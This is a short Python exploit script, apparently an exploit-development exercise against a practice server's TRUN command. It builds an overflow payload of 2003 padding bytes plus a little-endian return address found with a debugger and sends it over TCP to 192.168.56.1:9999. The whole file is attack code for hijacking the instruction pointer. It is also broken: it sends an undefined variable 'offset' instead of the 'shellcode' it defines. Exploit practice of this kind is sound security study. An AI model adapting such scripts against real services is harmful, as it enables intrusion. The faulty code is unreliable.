#!/usr/bin/python

import sys,socket

#625011af


shellcode = "A" * 2003 + "\xaf\x11\x50\x63"

#x86 architecture thus litte endian format and have same error with a jump point and locate it with immunity
#debugger

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.56.1',9999))
	s.send(('TRUN /.:/' + offset))
	s.close()
except:
	print("Error connecting to server")
	sys.exit()
